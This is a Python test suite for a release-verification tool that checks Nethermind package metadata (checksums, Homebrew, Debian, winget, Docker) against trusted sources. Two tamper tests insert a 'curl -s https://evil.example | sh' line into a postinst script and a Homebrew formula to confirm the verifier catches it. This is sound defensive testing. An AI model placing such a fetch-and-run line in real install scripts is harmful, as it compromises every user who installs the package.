"""Parsers for release metadata formats, exercised against real NMC 2.2.0 artifacts."""

import json
import unittest
from pathlib import Path

from release_verifier import channels, gitops, registry
from release_verifier.checksums import ChecksumsError, parse_sha256sums, strip_algo
from release_verifier.config import PROJECTS_DIR
from release_verifier.results import Status

FIX = Path(__file__).parent / "fixtures"
X64 = "5217a3b6fbd613696affd87cad595f0351cd9c5b68ddd4701bbcdf43f70ec55d"
ARM64 = "281f7e4cb8724492d872e46986c45e36529d7689441a271f3296fc221e60674b"


class Sha256SumsTest(unittest.TestCase):
    def test_parses_text_and_binary_mode(self):
        text = f"{X64}  nethermind-2.3.0-abcdef12-linux-x64.zip\n{ARM64.upper()} *nethermind-2.3.0-abcdef12-linux-arm64.zip\n\n"
        self.assertEqual(
            parse_sha256sums(text),
            {"nethermind-2.3.0-abcdef12-linux-x64.zip": X64, "nethermind-2.3.0-abcdef12-linux-arm64.zip": ARM64},
        )

    def test_strips_dot_slash(self):
        self.assertEqual(parse_sha256sums(f"{X64}  ./a.zip\n"), {"a.zip": X64})

    def test_rejects_duplicates(self):
        with self.assertRaisesRegex(ChecksumsError, "duplicate"):
            parse_sha256sums(f"{X64}  a.zip\n{ARM64}  a.zip\n")

    def test_rejects_malformed_and_paths(self):
        for bad in [f"{X64[:-1]}  a.zip", f"{X64} a.zip", "not a line", f"{X64}  ../a.zip", f"{X64}  dir/a.zip"]:
            with self.subTest(bad=bad), self.assertRaises(ChecksumsError):
                parse_sha256sums(bad + "\n")

    def test_strip_algo(self):
        self.assertEqual(strip_algo(f"sha256:{X64.upper()}"), X64)
        self.assertIsNone(strip_algo("sha512:abc"))
        self.assertIsNone(strip_algo(None))


class ChannelParsersTest(unittest.TestCase):
    def test_homebrew_formula(self):
        f = channels.parse_homebrew((FIX / "homebrew-nethermind-2.2.0.rb").read_text())
        self.assertEqual(f["version"], "2.2.0")
        self.assertEqual([e["url"].rsplit("/", 1)[1] for e in f["entries"]],
                         ["nethermind-2.2.0-1d2aff00-macos-x64.zip", "nethermind-2.2.0-1d2aff00-macos-arm64.zip"])
        self.assertEqual(f["entries"][0]["sha256"], "4c66c8833add8b803e0d506e996850a54887674a37fea8b21f070e8c940e8b94")
        self.assertEqual(f["entries"][1]["sha256"], "8249f04ee942758839718d6aaf6aa577e1bb9fddde14ddf415626286e3662f6f")

    def test_homebrew_rejects_orphan_sha(self):
        with self.assertRaises(ValueError):
            channels.parse_homebrew(f'version "1"\nsha256 "{X64}"\n')

    def test_postinst(self):
        entries = channels.parse_postinst((FIX / "postinst-2.2.0").read_text())
        self.assertEqual(entries, [
            {"url": "https://github.com/NethermindEth/nethermind/releases/download/2.2.0/nethermind-2.2.0-1d2aff00-linux-arm64.zip", "sha256": ARM64},
            {"url": "https://github.com/NethermindEth/nethermind/releases/download/2.2.0/nethermind-2.2.0-1d2aff00-linux-x64.zip", "sha256": X64},
        ])

    def test_winget_single_installer(self):
        m = channels.parse_winget_installer((FIX / "winget-2.2.0.installer.yaml").read_text())
        self.assertEqual(m["version"], "2.2.0")
        self.assertEqual(m["entries"], [{
            "arch": "x64",
            "url": "https://github.com/NethermindEth/nethermind/releases/download/2.2.0/nethermind-2.2.0-1d2aff00-windows-x64.zip",
            "sha256": "7798f602a675dd858d0b0fbd5830f920373edfb6bf94d2a8d7fb66573c064166",
        }])

    def test_winget_multiple_installers_and_nested_keys(self):
        text = """PackageIdentifier: Nethermind.Nethermind
PackageVersion: 2.3.0
InstallerType: zip
NestedInstallerFiles:
- RelativeFilePath: nethermind.exe
  PortableCommandAlias: nethermind
Installers:
- Architecture: arm64
  InstallerUrl: https://example/a-arm64.zip
  InstallerSha256: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
- InstallerUrl: https://example/a-x64.zip
  Architecture: x64
  InstallerSha256: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
ManifestType: installer
"""
        m = channels.parse_winget_installer(text)
        self.assertEqual([(e["arch"], e["url"], e["sha256"][:2]) for e in m["entries"]],
                         [("arm64", "https://example/a-arm64.zip", "aa"), ("x64", "https://example/a-x64.zip", "bb")])

    def test_winget_path(self):
        self.assertEqual(channels.winget_manifest_path("Nethermind.Nethermind", "2.2.0"),
                         "manifests/n/Nethermind/Nethermind/2.2.0/Nethermind.Nethermind.installer.yaml")

    def test_dsc_checksums(self):
        self.assertEqual(channels.parse_dsc_sha256((FIX / "nethermind_2.2.0.dsc").read_text()),
                         {"nethermind_2.2.0.tar.xz": "ddcff15491e810e0ef8b8999fac6353675eea9587a5ac601ffa0a8935d8a6435"})


REL = "https://github.com/NethermindEth/nethermind/releases/download/2.2.0"
PPA_ENTRIES = [{"url": f"{REL}/nethermind-2.2.0-1d2aff00-linux-arm64.zip", "sha256": ARM64},
               {"url": f"{REL}/nethermind-2.2.0-1d2aff00-linux-x64.zip", "sha256": X64}]
MAC = {"macos-x64": {"url": f"{REL}/nethermind-2.2.0-1d2aff00-macos-x64.zip", "sha256": "4c66c8833add8b803e0d506e996850a54887674a37fea8b21f070e8c940e8b94"},
       "macos-arm64": {"url": f"{REL}/nethermind-2.2.0-1d2aff00-macos-arm64.zip", "sha256": "8249f04ee942758839718d6aaf6aa577e1bb9fddde14ddf415626286e3662f6f"}}
CHANGELOG = ["nethermind ({version}) jammy; urgency=high", "  * Nethermind v{version}", " -- Nethermind <devops@nethermind.io>  {date}"]


def with_text(tree, path, text):
    tree = dict(tree)
    tree[path] = channels._file_entry(text)
    return tree


class ChannelContentTest(unittest.TestCase):
    """Executable channel content vs trusted content: real NMC 2.2.0 PPA upload and Homebrew formula."""

    def setUp(self):
        self.published = channels.tar_tree((FIX / "nethermind_2.2.0.tar.xz").read_bytes())
        trusted = channels.tar_tree((FIX / "ppa-source-2.2.0.tar.xz").read_bytes(), "scripts/build/ppa/")
        self.reference = channels.ppa_reference(trusted, "debian/postinst", PPA_ENTRIES)

    def evaluate(self, published):
        return channels.evaluate_source_tree("ppa@2.2.0", published, self.reference, CHANGELOG, "2.2.0", "scripts/build/ppa at 1d2aff00")

    def test_published_ppa_source_equals_trusted_tree(self):
        self.assertEqual(sorted(self.published), ["debian/changelog", "debian/control", "debian/copyright", "debian/postinst",
                                                  "debian/postrm", "debian/rules", "debian/source/format"])
        self.assertEqual(self.reference["debian/postinst"]["text"], (FIX / "postinst-2.2.0").read_text())
        r = self.evaluate(self.published)
        self.assertEqual(r.status, Status.PASS, r.details)

    def test_extra_install_command_with_matching_hashes_fails(self):
        # The reproduction from the review: url=/hash= assignments intact, one more command added.
        text = self.published["debian/postinst"]["text"].replace('echo "Successfully installed"', 'echo "Successfully installed"\n    curl -s https://evil.example | sh')
        tampered = with_text(self.published, "debian/postinst", text)
        self.assertEqual(channels.parse_postinst(text), PPA_ENTRIES)
        r = self.evaluate(tampered)
        self.assertEqual(r.status, Status.FAIL)
        self.assertIn("debian/postinst changed", r.message)
        self.assertIn("+    curl -s https://evil.example | sh", r.details["diffs"]["debian/postinst"])

    def test_added_removed_files_and_changelog_shape(self):
        added = with_text(self.published, "debian/preinst", "#!/bin/sh\nid\n")
        self.assertIn("debian/preinst added", self.evaluate(added).message)
        removed = dict(self.published)
        del removed["debian/postrm"]
        self.assertIn("debian/postrm removed", self.evaluate(removed).message)
        log = self.published["debian/changelog"]["text"]
        for bad in (log + "  * extra\n", log.replace("jammy", "noble"), log.replace("Fri, 16 Oct 2026", "yesterday")):
            with self.subTest(bad=bad):
                r = self.evaluate(with_text(self.published, "debian/changelog", bad))
                self.assertEqual(r.status, Status.FAIL)
                self.assertIn("not the generated changelog", r.message)

    def test_rewrite_mirrors_the_workflow_awk(self):
        text = "a\n  url=x # url\nb url\n  hash=y\n"
        self.assertEqual(channels.rewrite_assignments(text, "url", ["U1", "U2", "U3"]), "a\n  url=U1\nb url=U2\n  hash=y\n")
        self.assertEqual(channels.rewrite_assignments("url=a", "url", ["b"]), "url=b\n")

    def test_homebrew_template_renders_the_published_formula(self):
        template = (PROJECTS_DIR / "templates" / "nethermind" / "homebrew.rb").read_text()
        published = (FIX / "homebrew-nethermind-2.2.0.rb").read_text()
        want = channels.render_template(template, "2.2.0", MAC)
        self.assertEqual(channels.evaluate_template("homebrew@2.2.0", published, want, "homebrew.rb").status, Status.PASS)
        tampered = published.replace("    bin.install Dir['./NLog.config']", "    bin.install Dir['./NLog.config']\n    system \"curl https://evil.example | sh\"")
        self.assertEqual(channels.parse_homebrew(tampered)["entries"], channels.parse_homebrew(published)["entries"])
        r = channels.evaluate_template("homebrew@2.2.0", tampered, want, "homebrew.rb")
        self.assertEqual(r.status, Status.FAIL)
        self.assertIn('+    system "curl https://evil.example | sh"', r.details["diff"])
        with self.assertRaises(KeyError):
            channels.render_template(template, "2.2.0", {"macos-x64": MAC["macos-x64"]})
        with self.assertRaises(ValueError):
            channels.render_template("{{commit}}", "2.2.0", MAC)

    def test_winget_pinned_fields(self):
        pinned = {"InstallerType": ["zip"], "NestedInstallerType": ["portable"], "RelativeFilePath": ["nethermind.exe"]}
        text = (FIX / "winget-2.2.0.installer.yaml").read_text()
        fields = channels.parse_winget_installer(text)["fields"]
        self.assertEqual(channels.evaluate_pinned_fields("winget@2.2.0", fields, pinned).status, Status.PASS)
        override = text.replace("  InstallerUrl:", "  InstallerType: exe\n  InstallerUrl:")
        r = channels.evaluate_pinned_fields("winget@2.2.0", channels.parse_winget_installer(override)["fields"], pinned)
        self.assertEqual(r.status, Status.FAIL)
        self.assertEqual(r.details["found"], {"InstallerType": ["exe", "zip"]})



class RegistryTest(unittest.TestCase):
    def test_platform_filtering_skips_attestation_manifests(self):
        index = json.loads((FIX / "docker-index-2.2.0.json").read_text())
        self.assertEqual(len(index["manifests"]), 4)
        p, problems = registry.platform_manifests(index)
        self.assertEqual((sorted(p), problems), (["linux/amd64", "linux/arm64"], []))
        self.assertEqual(p["linux/amd64"]["digest"], "sha256:ffa9e3301a19ec506f494ebbb0fad44b12e84641c15d1cfc68c96e83ccbc0654")

    def test_variant_and_duplicates(self):
        idx = {"manifests": [{"digest": "a", "platform": {"os": "linux", "architecture": "arm", "variant": "v7"}}]}
        self.assertEqual(list(registry.platform_manifests(idx)[0]), ["linux/arm/v7"])
        dup = {"manifests": [{"digest": "a", "platform": {"os": "linux", "architecture": "amd64"}}] * 2}
        self.assertEqual(len(registry.platform_manifests(dup)[1]), 1)

    def test_parse_challenge(self):
        c = registry.parse_challenge('Bearer realm="https://auth.docker.io/token",service="registry.docker.io"')
        self.assertEqual(c, {"scheme": "bearer", "realm": "https://auth.docker.io/token", "service": "registry.docker.io"})


class LsRemoteTest(unittest.TestCase):
    def test_annotated_and_lightweight(self):
        text = (
            "1d2aff00ccee8df1ffabc142ee8ea61b3760754e\trefs/tags/2.2.0\n"
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\trefs/tags/2.3.0\n"
            "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\trefs/tags/2.3.0^{}\n"
        )
        self.assertEqual(gitops.parse_ls_remote(text), {
            "2.2.0": {"object": "1d2aff00ccee8df1ffabc142ee8ea61b3760754e", "type": "commit", "commit": "1d2aff00ccee8df1ffabc142ee8ea61b3760754e"},
            "2.3.0": {"object": "a" * 40, "type": "tag", "commit": "b" * 40},
        })


if __name__ == "__main__":
    unittest.main()
